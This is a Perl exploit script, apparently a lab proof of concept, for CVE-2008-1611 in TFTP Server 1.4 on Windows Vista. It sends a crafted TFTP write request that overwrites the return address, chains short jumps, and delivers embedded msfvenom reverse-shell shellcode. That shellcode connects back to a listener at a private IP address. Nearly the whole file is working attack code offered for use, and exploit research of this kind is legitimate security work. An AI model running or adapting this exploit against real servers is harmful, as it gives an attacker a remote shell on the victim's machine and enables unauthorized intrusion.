#!/usr/bin/perl

# CVE: CVE-2008-1611 (https://nvd.nist.gov/vuln/detail/CVE-2008-1611)
# Method: Partial EIP override
# Author: werebug (https://werebug.com)
# Tested on: Windows Vista SP 1
# Software: TFTP Server 1.4

#TFTP supports five types of packets, all of which have been mentioned
#   above:
#
#          opcode  operation
#            1     Read request (RRQ)
#            2     Write request (WRQ)
#            3     Data (DATA)
#            4     Acknowledgment (ACK)
#            5     Error (ERROR)
#
#   The TFTP header of a packet contains the  opcode  associated  with
#   that packet.
#
#            2 bytes     string    1 byte     string   1 byte
#            ------------------------------------------------
#           | Opcode |  Filename  |   0  |    Mode    |   0  |
#
#	The mode field contains the
#   string "netascii", "octet", or "mail" (or any combination of upper
#   and lower case, such as "NETASCII", NetAscii", etc.) in netascii
#   indicating the three modes defined in the protocol.

use strict;
use warnings;
use IO::Socket::INET;

my $opcode = "\x00\x02";

# EIP OVERRIDE AT 1524
# POP POP RET AT 0040484F
my $eip = "\x4F\x48\x40";

# First stage jump
# nasm > jmp short -40
# 00000000  EBD6              jmp short 0xffffffd8
my $first = "\xEB\xD6\x90\x90";

# Second stage, jmp 512 bytes back
my $second = "\x90\x90\xD9\xEE\xD9\x74\x24\xF4\x59\x80\xC1\x0A\x90\xFE\xCD\xFE\xCD\xFF\xE1";
$second .= "\x90" x (40 - length($second));

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.55 LPORT=4545 EXITFUNC=seh -f perl -e x86/shikata_ga_nai -b "\x00\x2F"
# Payload size: 351 bytes
my $third = "\x41" x 500;
$third .= "\x90" x 500;
$third .= "\xbe\x56\xa2\x51\xd4\xd9\xca\xd9\x74\x24\xf4\x5a\x29\xc9" .
"\xb1\x52\x83\xc2\x04\x31\x72\x0e\x03\x24\xac\xb3\x21\x34" .
"\x58\xb1\xca\xc4\x99\xd6\x43\x21\xa8\xd6\x30\x22\x9b\xe6" .
"\x33\x66\x10\x8c\x16\x92\xa3\xe0\xbe\x95\x04\x4e\x99\x98" .
"\x95\xe3\xd9\xbb\x15\xfe\x0d\x1b\x27\x31\x40\x5a\x60\x2c" .
"\xa9\x0e\x39\x3a\x1c\xbe\x4e\x76\x9d\x35\x1c\x96\xa5\xaa" .
"\xd5\x99\x84\x7d\x6d\xc0\x06\x7c\xa2\x78\x0f\x66\xa7\x45" .
"\xd9\x1d\x13\x31\xd8\xf7\x6d\xba\x77\x36\x42\x49\x89\x7f" .
"\x65\xb2\xfc\x89\x95\x4f\x07\x4e\xe7\x8b\x82\x54\x4f\x5f" .
"\x34\xb0\x71\x8c\xa3\x33\x7d\x79\xa7\x1b\x62\x7c\x64\x10" .
"\x9e\xf5\x8b\xf6\x16\x4d\xa8\xd2\x73\x15\xd1\x43\xde\xf8" .
"\xee\x93\x81\xa5\x4a\xd8\x2c\xb1\xe6\x83\x38\x76\xcb\x3b" .
"\xb9\x10\x5c\x48\x8b\xbf\xf6\xc6\xa7\x48\xd1\x11\xc7\x62" .
"\xa5\x8d\x36\x8d\xd6\x84\xfc\xd9\x86\xbe\xd5\x61\x4d\x3e" .
"\xd9\xb7\xc2\x6e\x75\x68\xa3\xde\x35\xd8\x4b\x34\xba\x07" .
"\x6b\x37\x10\x20\x06\xc2\xf3\x8f\x7f\xa8\x34\x78\x82\x30" .
"\x2a\xb9\x0b\xd6\x26\x29\x5a\x41\xdf\xd0\xc7\x19\x7e\x1c" .
"\xd2\x64\x40\x96\xd1\x99\x0f\x5f\x9f\x89\xf8\xaf\xea\xf3" .
"\xaf\xb0\xc0\x9b\x2c\x22\x8f\x5b\x3a\x5f\x18\x0c\x6b\x91" .
"\x51\xd8\x81\x88\xcb\xfe\x5b\x4c\x33\xba\x87\xad\xba\x43" .
"\x45\x89\x98\x53\x93\x12\xa5\x07\x4b\x45\x73\xf1\x2d\x3f" .
"\x35\xab\xe7\xec\x9f\x3b\x71\xdf\x1f\x3d\x7e\x0a\xd6\xa1" .
"\xcf\xe3\xaf\xde\xe0\x63\x38\xa7\x1c\x14\xc7\x72\xa5\x2a" .
"\x39\x4e\x30\xba\xe0\x3b\x79\xa6\x12\x96\xbe\xdf\x90\x12" .
"\x3f\x24\x88\x57\x3a\x60\x0e\x84\x36\xf9\xfb\xaa\xe5\xfa" .
"\x29";
$third .= "\x90" x (1524 - length($first . $second . $third));

my $payload = $third . $second . $first;
die "payload length wrong: " . length($payload) . "\n" if length($payload) ne 1524;

my $sep = "\x00";
my $mode = "netascii";
my $end = "\x00";

my $datagram = $opcode . $payload . $eip . $sep . $mode . $end;

print("Sending datagram of length " . length($datagram) . "\n");

my $sock = new IO::Socket::INET(PeerAddr => "192.168.101.147",
								PeerPort => 69,
								Proto => "udp",
								Timeout => 1) or die("Unable to open socket.\n");

print $sock $datagram;
close($sock);

print "Payload sent.\n";
